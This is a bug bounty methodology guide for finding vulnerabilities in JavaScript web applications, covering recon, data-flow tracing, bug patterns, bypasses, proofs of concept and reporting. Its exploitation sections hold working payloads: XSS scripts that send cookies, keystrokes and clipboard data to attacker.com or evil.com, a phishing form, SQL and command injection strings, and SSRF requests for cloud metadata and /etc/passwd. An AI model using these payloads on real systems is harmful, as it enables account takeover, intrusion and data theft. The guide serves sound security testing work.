# Deep Code Analysis Methodology for Bug Bounty Hunting
# Version: 3.0 (Mythos-Level)
# Purpose: Systematic approach to finding high-impact vulnerabilities in JavaScript applications through static analysis, data flow tracing, and manual review

---

## Table of Contents

1. [Philosophy & Mindset](#1-philosophy--mindset)
2. [Phase 0: Target Profiling](#2-phase-0-target-profiling)
3. [Phase 1: Reconnaissance & Asset Discovery](#3-phase-1-reconnaissance--asset-discovery)
4. [Phase 2: JavaScript Deep Analysis](#4-phase-2-javascript-deep-analysis)
5. [Phase 3: Data Flow Tracing](#5-phase-3-data-flow-tracing)
6. [Phase 4: Vulnerability Pattern Detection](#6-phase-4-vulnerability-pattern-detection)
7. [Phase 5: Sanitization & Bypass Analysis](#7-phase-5-sanitization--bypass-analysis)
8. [Phase 6: Dynamic Validation](#8-phase-6-dynamic-validation)
9. [Phase 7: Exploit Development](#9-phase-7-exploit-development)
10. [Phase 8: Attack Chain Construction](#10-phase-8-attack-chain-construction)
11. [Phase 9: Impact Assessment](#11-phase-9-impact-assessment)
12. [Phase 10: Reporting](#12-phase-10-reporting)
13. [Advanced Techniques](#13-advanced-techniques)
14. [Framework-Specific Analysis](#14-framework-specific-analysis)
15. [Bypass Catalog](#15-bypass-catalog)
16. [Tool Reference](#16-tool-reference)
17. [Real-World Case Studies](#17-real-world-case-studies)

---

## 1. Philosophy & Mindset

### 1.1 The Analyst's Mindset

Deep code analysis is not about running automated scanners. It is about **understanding intent** — the developer's intent, the data's journey, and the attacker's path. Every line of JavaScript tells a story about how data enters, transforms, and exits the system.

**Core Principles:**

- **Follow the data.** Every vulnerability begins with user-controlled input reaching a dangerous sink. Your job is to trace that journey.
- **Assume nothing.** Frameworks have bugs. Libraries have CVEs. Sanitizers have bypasses. Trust nothing, verify everything.
- **Think in chains.** A single low-severity finding becomes critical when chained with another. Always look for the next step.
- **Understand context.** The same code can be safe in one context and exploitable in another. Context determines everything.
- **Be systematic.** Random testing finds random bugs. Systematic analysis finds consistent bugs.

### 1.2 What Makes Deep Analysis Different

| Surface Scanning | Deep Code Analysis |
|------------------|-------------------|
| Runs automated tools | Reads and understands code |
| Finds known patterns | Finds unknown patterns |
| Reports symptoms | Reports root causes |
| High false positive rate | Low false positive rate |
| Misses logic bugs | Catches logic bugs |
| No chain building | Constructs attack chains |

### 1.3 Time Allocation

For a typical bug bounty target:

| Phase | Time % | Activities |
|-------|--------|------------|
| Recon | 15% | Asset discovery, technology fingerprinting |
| Analysis | 35% | JavaScript reading, data flow tracing |
| Validation | 25% | Manual testing, PoC development |
| Reporting | 15% | Documentation, report writing |
| Research | 10% | Framework research, CVE analysis |

---

## 2. Phase 0: Target Profiling

Before touching a single line of code, understand what you are attacking.

### 2.1 Scope Definition

```bash
# HackerOne scope parsing
# Read the program page carefully:
# - Which domains are in scope?
# - Which subdomains are explicitly out of scope?
# - Are there any special rules?
# - What is the bounty range?
# - Are there any excluded vulnerability classes?

# Example scope analysis:
# In scope: *.target.com, api.target.com, app.target.com
# Out of scope: *.target.io (third-party), stage.target.com (non-prod)
# Excluded: Clickjacking, SSL/TLS issues, CSRF on logout
```

### 2.2 Business Logic Understanding

Before analyzing code, understand the business:

```bash
# Key questions to answer:
# 1. What does this application do?
# 2. What is the core business model?
# 3. Where does money flow?
# 4. What data is most valuable?
# 5. Who are the users (buyers, sellers, admins)?
# 6. What actions have real-world consequences?

# For an e-commerce platform:
# - Payment processing (high value)
# - Order management (business logic)
# - User accounts (privilege escalation)
# - Product listings (content injection)
# - Search functionality (injection)
```

### 2.3 Technology Stack Identification

```bash
# Framework Detection
grep -r "React\|ReactDOM\|createElement" js/ | head -20
grep -r "Vue\|createApp\|Vue.use" js/ | head -20
grep -r "Angular\|ng-app\|@Component" js/ | head -20
grep -r "Next\|__NEXT_DATA__\|getServerSideProps" js/ | head -20
grep -r "Nuxt\|__NUXT__\|asyncData" js/ | head -20

# Backend Detection (from API patterns)
grep -r "express\|fastify\|koa\|hapi" js/ | head -20
grep -r "graphql\|apollo\|urql" js/ | head -20
grep -r "sequelize\|prisma\|mongoose\|typeorm" js/ | head -20

# Build Tool Detection
grep -r "webpack\|__webpack_require__\|webpackJsonp" js/ | head -20
grep -r "vite\|import.meta.hot" js/ | head -20
grep -r "rollup\|defineProperty\|__esModule" js/ | head -20

# Security Library Detection
grep -r "DOMPurify\|dompurify\|sanitize" js/ | head -20
grep -r "helmet\|cors\|csrf" js/ | head -20
grep -r "bcrypt\|argon2\|scrypt" js/ | head -20
```

### 2.4 Attack Surface Mapping

```bash
# Create a mental model of the application:

# User Types:
# - Anonymous users (unauthenticated)
# - Regular users (authenticated)
# - Premium users (paid features)
# - Admin users (privileged)
# - Super admin (full access)

# Data Types:
# - Public data (product listings, profiles)
# - Private data (messages, orders)
# - Sensitive data (payment info, PII)
# - System data (configs, secrets)

# Actions:
# - Read operations (GET)
# - Write operations (POST, PUT, PATCH)
# - Delete operations (DELETE)
# - Administrative operations (admin endpoints)
```

---

## 3. Phase 1: Reconnaissance & Asset Discovery

### 3.1 JavaScript File Discovery

```bash
# Method 1: HTML source analysis
curl -s https://target.com | grep -oP 'src="[^"]*\.js[^"]*"'

# Method 2: Wayback Machine
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=urlkey,timestamp,original&filter=mimetype:application/javascript" | jq -r '.[][2]' | sort -u

# Method 3: GitHub search
# Search for: "target.com" language:javascript
# Look for: API endpoints, hardcoded tokens, internal paths

# Method 4: Certificate Transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Method 5: JavaScript bundle analysis
# Modern SPAs bundle code into chunks:
# _next/static/chunks/ webpack chunks
# _next/static/[hash]/ page-specific bundles
# /assets/ generic static assets
```

### 3.2 Endpoint Discovery from JavaScript

```bash
# Extract API endpoints
grep -r "fetch\|axios\|http\." js/ | grep -oP '"[^"]*api[^"]*"' | sort -u

# Extract GraphQL operations
grep -r "query\|mutation\|subscription" js/ | grep -oP 'query\s+\w+|mutation\s+\w+' | sort -u

# Extract route definitions
grep -r "path:\|route:\|Route\|Router" js/ | grep -oP '["'"'"'][/][^"'"'"']*["'"'"']' | sort -u

# Extract WebSocket connections
grep -r "wss\|ws:\|socket\|WebSocket" js/ | head -20

# Extract hidden endpoints
grep -r "/admin\|/internal\|/debug\|/test\|/staging" js/ | head -20
```

### 3.3 Third-Party Service Discovery

```bash
# Payment processors
grep -r "stripe\|braintree\|paypal\|square\|adyen" js/ | head -20

# Cloud services
grep -r "aws\|gcp\|azure\|firebase\|supabase" js/ | head -20

# Analytics and tracking
grep -r "google-analytics\|segment\|amplitude\|mixpanel" js/ | head -20

# Authentication providers
grep -r "auth0\|okta\|firebase-auth\|cognito\|clerk" js/ | head -20

# CDN and hosting
grep -r "cloudflare\|cloudfront\|fastly\|netlify\|vercel" js/ | head -20
```

---

## 4. Phase 2: JavaScript Deep Analysis

This is the core of the methodology. You are reading code, not scanning it.

### 4.1 File Organization Understanding

Modern JavaScript applications use code splitting. Understanding the file organization is critical:

```
_next/static/chunks/
├── framework-[hash].js          # React/Next.js framework code
├── webpack-[hash].js            # Webpack runtime
├── main-[hash].js               # Application entry point
├── pages/
│   ├── index-[hash].js          # Homepage
│   ├── login-[hash].js          # Login page
│   └── dashboard-[hash].js      # Dashboard page
├── components/
│   ├── Header-[hash].js         # Header component
│   └── PaymentForm-[hash].js    # Payment form
└── lib/
    ├── api-[hash].js            # API client
    └── auth-[hash].js           # Authentication utilities
```

**Priority files to analyze:**
1. `api-*.js` - Contains all API calls and endpoints
2. `auth-*.js` - Contains authentication logic
3. `payment-*.js` - Contains payment processing
4. `admin-*.js` - Contains admin functionality
5. `components/*.js` - Contains UI logic and user input handling

### 4.2 Reading Minified JavaScript

Minified code is unreadable by default. Here is how to approach it:

```bash
# Step 1: Use browser DevTools Pretty Print
# In Chrome: Click {} button in Sources tab
# This reformats the code with proper indentation

# Step 2: Use online beautifiers
# https://beautifier.io/
# https://jsbeautifier.org/

# Step 3: Search for key patterns, not full code
# Instead of reading everything, search for:
grep -n "paymentData" js/chunk-abc123.js
grep -n "setDefaultPayment" js/chunk-abc123.js
grep -n "session" js/chunk-abc123.js

# Step 4: Extract surrounding context
# Once you find a pattern, extract 50 lines around it:
grep -n -B 25 -A 25 "paymentData" js/chunk-abc123.js
```

### 4.3 Code Reading Strategy

**Do not try to read everything.** Focus on high-value targets:

```
Priority 1 (Critical):
├── Authentication flows (login, register, password reset)
├── Payment processing (checkout, payment methods, refunds)
├── Admin functionality (user management, settings)
└── API client code (how requests are made)

Priority 2 (High):
├── Form components (user input handling)
├── URL handling (redirects, routing)
├── Storage usage (localStorage, cookies, sessionStorage)
└── WebSocket connections (real-time data)

Priority 3 (Medium):
├── Search functionality
├── File upload components
├── Export/import features
└── Third-party integrations

Priority 4 (Low):
├── UI components (buttons, modals)
├── Styling logic
├── Animation code
└── Analytics tracking
```

### 4.4 Function-Level Analysis

When you find a function of interest, analyze it systematically:

```javascript
// Example: analyze this function
function processPayment(paymentData) {
  const session = getSession();
  const amount = calculateAmount(paymentData.items);
  const result = stripe.charges.create({
    amount: amount,
    currency: 'usd',
    source: paymentData.token,
    metadata: { userId: session.userId }
  });
  return result;
}

// Analysis questions:
// 1. What are the inputs?
//    - paymentData (user-controlled)
//    - session (server-controlled)
//
// 2. What are the outputs?
//    - result (payment confirmation)
//
// 3. What are the side effects?
//    - Charges credit card
//    - Creates database record
//
// 4. What could go wrong?
//    - amount could be manipulated
//    - paymentData.token could be stolen
//    - session could be hijacked
//
// 5. What validation exists?
//    - calculateAmount() - unknown validation
//    - No input sanitization visible
```

---

## 5. Phase 3: Data Flow Tracing

This is the most critical phase. You are tracing how data moves through the application.

### 5.1 Source Taxonomy

Every vulnerability starts with a source. Know all of them:

```javascript
// === URL-BASED SOURCES ===
// Query parameters
const id = new URLSearchParams(window.location.search).get('id');
const redirect = params.get('redirect');
const callback = url.searchParams.get('callback');

// Hash fragments
const hash = window.location.hash;
const section = window.location.hash.substring(1);

// Path parameters (React Router, Next.js)
const { id } = useParams();
const slug = router.query.slug;

// === STORAGE-BASED SOURCES ===
// Cookies
const token = document.cookie.match(/token=([^;]+)/)?.[1];
const preferences = JSON.parse(document.cookie);

// Local Storage
const settings = JSON.parse(localStorage.getItem('settings'));
const user = localStorage.getItem('user');

// Session Storage
const tempData = sessionStorage.getItem('tempData');

// IndexedDB (async)
const db = await indexedDB.open('myDB');

// === DOM-BASED SOURCES ===
// Form inputs
const email = document.getElementById('email').value;
const password = inputRef.current.value;

// Contenteditable
const content = document.getElementById('editor').innerHTML;

// File inputs
const fileName = fileInput.files[0].name;
const fileContent = await file.text();

// === NETWORK-BASED SOURCES ===
// API responses
const data = await fetch('/api/user').then(r => r.json());

// WebSocket messages
socket.on('message', (data) => { /* data is source */ });

// Server-sent events
eventSource.onmessage = (event) => { /* event.data is source */ };

// === MESSAGE-BASED SOURCES ===
// PostMessage
window.onmessage = (event) => { /* event.data is source */ };

// BroadcastChannel
const bc = new BroadcastChannel('channel');
bc.onmessage = (event) => { /* event.data is source */ };
```

### 5.2 Sink Taxonomy

Every vulnerability ends at a sink. Know all of them:

```javascript
// === CRITICAL SINKS (Direct Code Execution) ===
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);  // if userInput is string
setInterval(userInput, 1000); // if userInput is string

// === HIGH SINKS (DOM Manipulation) ===
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML('beforeend', userInput);

// === HIGH SINKS (Server-Side) ===
db.query(userInput);           // SQL
exec(userInput);               // Command
child_process.spawn(userInput); // Command
fs.readFile(userInput);        // Path traversal

// === MEDIUM SINKS (Navigation) ===
window.location = userInput;
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
window.open(userInput);

// === MEDIUM SINKS (Network) ===
fetch(userInput);
axios.get(userInput);
$.ajax({ url: userInput });
XMLHttpRequest.open('GET', userInput);

// === MEDIUM SINKS (Data Exposure) ===
res.send(userInput);
res.json(userInput);
console.log(userInput);
alert(userInput);
```

### 5.3 Data Flow Distance

The distance between source and sink determines exploitability:

```
Distance 1-5 lines:   CRITICAL - Direct flow, easy to exploit
Distance 6-15 lines:  HIGH - Short flow, likely exploitable
Distance 16-30 lines: MEDIUM - Medium flow, needs investigation
Distance 31-50 lines: LOW - Long flow, may be transformed
Distance 50+ lines:   INFO - Very long flow, likely safe
```

**Why distance matters:**

```javascript
// Distance 1 - CRITICAL
const x = params.get('q');
element.innerHTML = x;

// Distance 3 - HIGH
const q = params.get('q');
const sanitized = q.replace(/</g, '&lt;');
element.innerHTML = sanitized;
// Note: sanitization is weak, still exploitable

// Distance 10 - MEDIUM
const query = params.get('q');
const validated = validateInput(query);
const encoded = encodeURIComponent(validated);
const url = `/search?q=${encoded}`;
fetch(url).then(r => r.json()).then(data => {
  element.innerHTML = data.results;
});
// Note: multiple transformations, need to check each

// Distance 20+ - LOW
const input = params.get('q');
const step1 = sanitize(input);
const step2 = encode(step1);
const step3 = validate(step2);
const step4 = transform(step3);
// ... many more steps
element.innerHTML = stepN;
// Note: likely safe due to transformations
```

### 5.4 Data Flow Tracing Technique

```bash
# Step 1: Identify the source
grep -n "params\.get\|searchParams\|location\.search" js/chunk.js

# Step 2: Find where the variable is assigned
# If source is: const x = params.get('q')
# Search for: x (be careful, common variable name)
grep -n "\bx\b" js/chunk.js | head -30

# Step 3: Follow the variable through assignments
# If x is reassigned: x = transform(x)
# Search for: x = 
grep -n "\bx\s*=" js/chunk.js

# Step 4: Find function calls on the variable
# If x is passed to a function: process(x)
# Search for: process(
grep -n "process(" js/chunk.js

# Step 5: Find where the variable reaches a sink
# Search for dangerous functions near the variable
grep -n "innerHTML\|eval\|document\.write" js/chunk.js

# Step 6: Map the complete flow
# Source (line 10) → Assignment (line 15) → Function (line 20) → Sink (line 25)
```

### 5.5 Multi-Path Analysis

Data often flows through multiple paths. Map all of them:

```javascript
// Example: user input reaches innerHTML through different paths

// Path 1: Direct (CRITICAL)
const q = params.get('q');
element.innerHTML = q;

// Path 2: Via API (HIGH)
const q = params.get('q');
const result = await fetch(`/api/search?q=${q}`);
const data = await result.json();
element.innerHTML = data.html;

// Path 3: Via Storage (MEDIUM)
const q = params.get('q');
localStorage.setItem('search', q);
// ... later ...
const saved = localStorage.getItem('search');
element.innerHTML = saved;

// Path 4: Via PostMessage (MEDIUM)
const q = params.get('q');
window.parent.postMessage({ query: q }, '*');
// ... in parent frame ...
window.onmessage = (e) => {
  element.innerHTML = e.data.query;
};
```

---

## 6. Phase 4: Vulnerability Pattern Detection

### 6.1 Cross-Site Scripting (XSS)

#### Reflected XSS
```javascript
// Pattern: URL parameter → DOM sink
// Detection:
grep -n "location\.search\|params\.get\|searchParams" js/
grep -n "innerHTML\|outerHTML\|document\.write" js/

// Example vulnerable code:
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

// Exploitation:
// ?name=<script>alert(1)</script>
// ?name=<img src=x onerror=alert(1)>
```

#### Stored XSS
```javascript
// Pattern: Database/API → DOM sink
// Detection:
grep -n "\.then\|await\|response\.json" js/ | head -20
grep -n "innerHTML\|outerHTML" js/

// Example vulnerable code:
const comment = await fetch(`/api/comments/${id}`).then(r => r.json());
div.innerHTML = comment.body;  // comment.body from database

// Exploitation:
// Submit comment with: <script>fetch('https://evil.com?c='+document.cookie)</script>
```

#### DOM-based XSS
```javascript
// Pattern: Client-side source → Client-side sink (no server involvement)
// Detection:
grep -n "location\.\|document\.URL\|document\.referrer" js/
grep -n "innerHTML\|eval\|setTimeout" js/

// Example vulnerable code:
eval(location.hash.substring(1));

// Exploitation:
#javascript:alert(1)
```

#### Mutation XSS (mXSS)
```javascript
// Pattern: HTML entities decoded into dangerous HTML
// Detection:
// Look for: innerHTML after decoding entities
// Look for: template literals with user input

// Example vulnerable code:
const div = document.createElement('div');
div.innerHTML = userInput;  // Browser decodes entities
const text = div.textContent;  // Decoded text
div.innerHTML = text;  // Re-inserted, now dangerous

// Exploitation:
// Input: &lt;script&gt;alert(1)&lt;/script&gt;
// After first innerHTML: <script>alert(1)</script>
// After textContent: <script>alert(1)</script>
// After second innerHTML: XSS executes
```

### 6.2 Injection Vulnerabilities

#### SQL Injection
```javascript
// Pattern: User input → SQL query
// Detection:
grep -n "query\|execute\|SELECT\|INSERT\|UPDATE\|DELETE" js/
grep -n "\.raw\|\.sql\|knex\|sequelize" js/

// Example vulnerable code:
const query = `SELECT * FROM users WHERE id = '${userId}'`;
db.query(query);

// Exploitation:
// userId: ' OR '1'='1
// userId: ' UNION SELECT NULL,username,password FROM users--
```

#### NoSQL Injection
```javascript
// Pattern: User input → NoSQL query
// Detection:
grep -n "findOne\|find\|aggregate\|MongoDB" js/
grep -n "\$where\|"\$gt\|"\$regex" js/

// Example vulnerable code:
const user = await User.findOne({ username: req.body.username });

// Exploitation:
// username: {"$gt": ""}
// username: {"$ne": null}
```

#### Command Injection
```javascript
// Pattern: User input → OS command
// Detection:
grep -n "exec\|spawn\|child_process\|system" js/
grep -n "\.exec\(\|\.spawn\(" js/

// Example vulnerable code:
const { exec } = require('child_process');
exec(`ping ${req.body.host}`);

// Exploitation:
// host: 127.0.0.1; cat /etc/passwd
// host: 127.0.0.1 | dir
```

#### LDAP Injection
```javascript
// Pattern: User input → LDAP query
// Detection:
grep -n "ldap\|authenticate\|bind" js/

// Example vulnerable code:
const filter = `(cn=${req.body.username})`;
ldapClient.search(filter);

// Exploitation:
// username: *)(uid=*))(|(uid=*
```

### 6.3 Server-Side Request Forgery (SSRF)

```javascript
// Pattern: User input → HTTP request from server
// Detection:
grep -n "fetch\|axios\|request\|http\." js/
grep -n "url\|href\|endpoint\|webhook" js/

// Example vulnerable code:
const response = await fetch(req.body.webhookUrl);
const data = await response.json();

// Exploitation:
// webhookUrl: http://169.254.169.254/latest/meta-data/ (AWS)
// webhookUrl: http://metadata.google.internal/ (GCP)
// webhookUrl: file:///etc/passwd (Local file read)
```

### 6.4 Insecure Direct Object References (IDOR)

```javascript
// Pattern: User-controlled ID → Data access without authorization check
// Detection:
grep -n "req\.params\.\|req\.query\.\|req\.body\." js/
grep -n "findById\|findOne\|get(" js/

// Example vulnerable code:
const order = await Order.findById(req.params.orderId);
res.json(order);

// Exploitation:
// Change orderId from 123 to 124 to access other user's order
```

### 6.5 Mass Assignment

```javascript
// Pattern: User input directly assigned to object
// Detection:
grep -n "Object\.assign\|\.\.\.req\.body\|User\.create" js/
grep -n "is_admin\|role\|verified\|admin" js/

// Example vulnerable code:
const user = await User.create(req.body);

// Exploitation:
// Send: {"username": "hacker", "email": "hacker@evil.com", "is_admin": true}
```

### 6.6 Prototype Pollution

```javascript
// Pattern: User input → Object property → Dangerous sink
// Detection:
grep -n "__proto__\|constructor\|prototype" js/
grep -n "\.merge\|\.extend\|\.assign\|Object\.keys" js/

// Example vulnerable code:
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Exploitation:
// {"__proto__": {"admin": true}}
// After merge: object.__proto__.admin = true
// Any new object will have admin: true
```

### 6.7 Open Redirect

```javascript
// Pattern: User input → URL redirect
// Detection:
grep -n "location\.href\|location\.assign\|location\.replace" js/
grep -n "redirect\|return_url\|next\|callback" js/

// Example vulnerable code:
const redirect = params.get('redirect');
if (redirect.startsWith('/')) {
  window.location = redirect;
}

// Exploitation:
// redirect: //evil.com (protocol-relative URL)
// redirect: /\/evil.com (bypass startsWith check)
```

### 6.8 JWT Vulnerabilities

```javascript
// Pattern: JWT handling without proper validation
// Detection:
grep -n "jwt\|jsonwebtoken\|jose" js/
grep -n "verify\|decode\|secret\|algorithm" js/

// Vulnerable patterns:
// 1. alg: none accepted
// 2. Weak secret
// 3. No expiration check
// 4. kid parameter injection

// Example vulnerable code:
const decoded = jwt.decode(token);  // No verification!

// Exploitation:
// Modify JWT header: {"alg": "none"}
// Remove signature
```

### 6.9 GraphQL Vulnerabilities

```javascript
// Pattern: GraphQL-specific issues
// Detection:
grep -n "graphql\|gql\|query\|mutation" js/
grep -n "__schema\|__type\|introspection" js/

// Vulnerable patterns:
// 1. Introspection enabled
// 2. No depth limiting (DoS)
// 3. No query complexity limiting
// 4. Field suggestions (info disclosure)
// 5. Batch query abuse

// Example vulnerable code:
// Query: { __schema { types { name } } }
// Returns full schema in production
```

---

## 7. Phase 5: Sanitization & Bypass Analysis

### 7.1 Sanitization Detection

```bash
# DOMPurify
grep -n "DOMPurify\|dompurify\|sanitize" js/

# Custom sanitizers
grep -n "escape\|encode\|sanitize\|clean\|filter" js/

# Encoding functions
grep -n "encodeURIComponent\|encodeURI\|btoa\|atob" js/

# CSP headers
grep -n "Content-Security-Policy\|nonce\|unsafe-inline" js/
```

### 7.2 Sanitization Bypass Techniques

```javascript
// Bypass 1: DOMPurify with CONFIG
DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ['script'] });

// Bypass 2: DOMPurify with data attributes
// Input: <img src=x onerror=alert(1) data-x="y">
// DOMPurify may allow data-* attributes

// Bypass 3: Custom sanitizer using regex
// If sanitizer uses: userInput.replace(/<script>/gi, '')
// Bypass: <scr<script>ipt>

// Bypass 4: HTML entity decoding
// If sanitizer decodes entities after filtering
// Input: &lt;script&gt;alert(1)&lt;/script&gt;

// Bypass 5: Double encoding
// Input: %253Cscript%253E

// Bypass 6: Null bytes
// Input: <scr%00ipt>

// Bypass 7: Case variation
// Input: <ScRiPt>

// Bypass 8: Protocol handlers
// Input: <script>alert(1)</script>
// Input: javascript:alert(1)
// Input: data:text/html,<script>alert(1)</script>
```

### 7.3 CSP Bypass

```javascript
// Bypass 1: script-src 'unsafe-eval'
// Use: eval() for XSS

// Bypass 2: script-src 'unsafe-inline'
// Use: <script>alert(1)</script>

// Bypass 3: script-src with CDN
// Use: CDN that allows file upload (polyfill.io)

// Bypass 4: style-src 'unsafe-inline'
// Use: CSS expression() for older IE

// Bypass 5: Missing frame-ancestors
// Use: Clickjacking

// Bypass 6: Missing object-src
// Use: Flash/Java applet injection
```

---

## 8. Phase 6: Dynamic Validation

### 8.1 Manual Testing Methodology

```bash
# Step 1: Set up intercepting proxy
# Configure Burp Suite or OWASP ZAP
# Set browser to use proxy

# Step 2: Map the application
# Spider the application
# Identify all endpoints
# Map parameters and data types

# Step 3: Test each finding
# For each vulnerability found in code analysis:
# 1. Construct the request
# 2. Send via proxy
# 3. Analyze response
# 4. Confirm exploitability

# Step 4: Document evidence
# Save request/response pairs
# Take screenshots
# Record timing information
```

### 8.2 Automated Testing with Burp Suite

```bash
# 1. Spider the target
# Target → Site Map → Spider

# 2. Active scanning
# Target → Site Map → Select URLs → Actively scan

# 3. Intruder attacks
# For parameter fuzzing:
# Positions: parameter value
# Payloads: fuzzing wordlist
# Attack type: Sniper/Battering ram

# 4. Comparer
# Compare responses to identify differences
```

### 8.3 Browser DevTools Analysis

```javascript
// Network tab analysis
// 1. Filter by XHR/Fetch
// 2. Look for sensitive data in responses
// 3. Check for missing security headers
// 4. Monitor WebSocket messages

// Sources tab analysis
// 1. Search for sensitive strings
// 2. Set breakpoints on key functions
// 3. Watch variable values
// 4. Trace execution flow

// Application tab analysis
// 1. Check localStorage/sessionStorage
// 2. Examine cookies
// 3. Review service workers
// 4. Check IndexedDB
```

---

## 9. Phase 7: Exploit Development

### 9.1 Proof of Concept Structure

```markdown
## PoC Structure

### 1. Prerequisites
- What access is needed?
- What accounts are required?
- What tools are needed?

### 2. Setup
- How to prepare the environment
- What URLs to visit
- What data to enter

### 3. Exploitation Steps
- Step-by-step instructions
- Exact payloads to use
- Expected responses

### 4. Impact Demonstration
- What data is accessed
- What actions are performed
- What is the business impact

### 5. Evidence
- Screenshots
- Request/response pairs
- Code references
```

### 9.2 XSS Exploit Development

```javascript
// Basic XSS PoC
<script>alert('XSS')</script>

// Data exfiltration
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// Keylogging
<script>
document.onkeypress = (e) => {
  fetch('https://attacker.com/log?key=' + e.key)
}
</script>

// Clipboard theft
<script>
document.onpaste = (e) => {
  fetch('https://attacker.com/clip?data=' + e.clipboardData.getData('text'))
}
</script>

// Phishing via DOM manipulation
<script>
document.body.innerHTML = `
  <h1>Login Required</h1>
  <form action="https://attacker.com/phish">
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Login</button>
  </form>
`
</script>
```

### 9.3 IDOR Exploit Development

```bash
# Step 1: Identify object IDs
# Look for: userId, orderId, accountId, etc.

# Step 2: Test with different IDs
curl -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/orders/123
curl -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/orders/124

# Step 3: Document access
# If both return data: IDOR confirmed

# Step 4: Scale the attack
# Iterate through IDs to enumerate data
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/orders/$i
done
```

### 9.4 SSRF Exploit Development

```bash
# Step 1: Test basic SSRF
curl -X POST https://target.com/api/webhook -d '{"url": "http://127.0.0.1"}'

# Step 2: Test cloud metadata
# AWS
curl -X POST https://target.com/api/webhook -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# GCP
curl -X POST https://target.com/api/webhook -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'

# Azure
curl -X POST https://target.com/api/webhook -d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'

# Step 3: Test internal services
curl -X POST https://target.com/api/webhook -d '{"url": "http://localhost:3000/admin"}'
curl -X POST https://target.com/api/webhook -d '{"url": "http://localhost:8080/debug"}'

# Step 4: File read via SSRF
curl -X POST https://target.com/api/webhook -d '{"url": "file:///etc/passwd"}'
curl -X POST https://target.com/api/webhook -d '{"url": "file:///proc/self/environ"}'
```

---

## 10. Phase 8: Attack Chain Construction

### 10.1 Chain Components

```
Initial Access → Privilege Escalation → Data Exfiltration → Impact
     ↓                    ↓                     ↓              ↓
   XSS                  IDOR               SQLi          Data Breach
   Open Redirect    Mass Assignment      File Read      Account Takeover
   CSRF              JWT Manipulation    SSRF           Financial Loss
```

### 10.2 Chain Building Rules

1. **Must have initial access vector** - How do you get in?
2. **Must have impact** - What is the business impact?
3. **Severity should increase** - Each step should escalate
4. **No single point of failure** - Multiple paths to impact
5. **Practically exploitable** - Must work in real conditions

### 10.3 Example Chains

#### Chain 1: XSS → Account Takeover
```
1. Find reflected XSS in search parameter
2. Craft URL that steals session cookie
3. Send URL to victim
4. Capture session cookie
5. Use session to take over account
```

#### Chain 2: Open Redirect → OAuth Theft
```
1. Find open redirect in login flow
2. Craft redirect to attacker-controlled OAuth callback
3. User logs in normally
4. OAuth code sent to attacker
5. Attacker exchanges code for access token
6. Attacker accesses user's data
```

#### Chain 3: SSRF → Cloud Metadata → Credentials
```
1. Find SSRF in webhook feature
2. Access AWS metadata endpoint
3. Retrieve IAM credentials from metadata
4. Use credentials to access S3 bucket
5. Download sensitive data from bucket
```

---

## 11. Phase 9: Impact Assessment

### 11.1 Impact Categories

```yaml
Confidentiality Impact:
  - Data exposure (PII, credentials, secrets)
  - Account takeover
  - Business data leakage
  - Intellectual property theft

Integrity Impact:
  - Data modification
  - Privilege escalation
  - Business logic abuse
  - Financial fraud

Availability Impact:
  - Denial of service
  - Data destruction
  - Service disruption
  - Resource exhaustion

Business Impact:
  - Financial loss
  - Reputation damage
  - Legal/regulatory consequences
  - Operational disruption
```

### 11.2 CVSS Scoring

```yaml
Attack Vector (AV):
  Network (N): 0.85
  Adjacent (A): 0.62
  Local (L): 0.55
  Physical (P): 0.20

Attack Complexity (AC):
  Low (L): 0.77
  High (H): 0.44

Privileges Required (PR):
  None (N): 0.85
  Low (L): 0.62
  High (H): 0.27

User Interaction (UI):
  None (N): 0.85
  Required (R): 0.62

Scope (S):
  Unchanged (U): 1.0
  Changed (C): 1.08

Confidentiality (C):
  None (N): 0.00
  Low (L): 0.22
  High (H): 0.56

Integrity (I):
  None (N): 0.00
  Low (L): 0.22
  High (H): 0.56

Availability (A):
  None (N): 0.00
  Low (L): 0.22
  High (H): 0.56
```

### 11.3 Severity Decision Guide

| Score Range | Severity | Bounty Range | Examples |
|-------------|----------|--------------|----------|
| 9.0-10.0 | Critical | $5,000-$10,000+ | RCE, SQLi, Auth Bypass |
| 7.0-8.9 | High | $1,000-$5,000 | XSS, IDOR, SSRF |
| 4.0-6.9 | Medium | $500-$1,000 | Open Redirect, CSRF |
| 0.1-3.9 | Low | $100-$500 | Info Disclosure, Missing Headers |
| 0.0 | Info | $0-$100 | Best Practice Issues |

---

## 12. Phase 10: Reporting

### 12.1 Report Structure

```markdown
# [SEVERITY] [VULNERABILITY_TYPE] in [ENDPOINT/FEATURE]

## Summary
[One paragraph summary of the vulnerability]

## Vulnerability Details
### Affected Endpoint
- **URL:** [Full URL]
- **Method:** [HTTP Method]
- **Parameters:** [List of parameters]

### Description
[Detailed description of the vulnerability]

### Root Cause
[Why the vulnerability exists]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. [Step 4]
5. [Step 5]

### Proof of Concept
```
[Request/Response example]
```

## Impact
### Confidentiality Impact
[What data can be accessed]

### Integrity Impact
[What data can be modified]

### Availability Impact
[What services can be disrupted]

### Business Impact
[Real-world business consequences]

## Remediation
### Immediate Actions
[Quick fixes]

### Long-term Solutions
[Permanent fixes]

### Security Best Practices
[Preventive measures]

## References
- [OWASP Reference]
- [CWE Reference]
- [CVE Reference]

## CVSS Score
[CVSS vector and score]

## Affected Versions
[Which versions are vulnerable]

## Discoverer
[Your information]
```

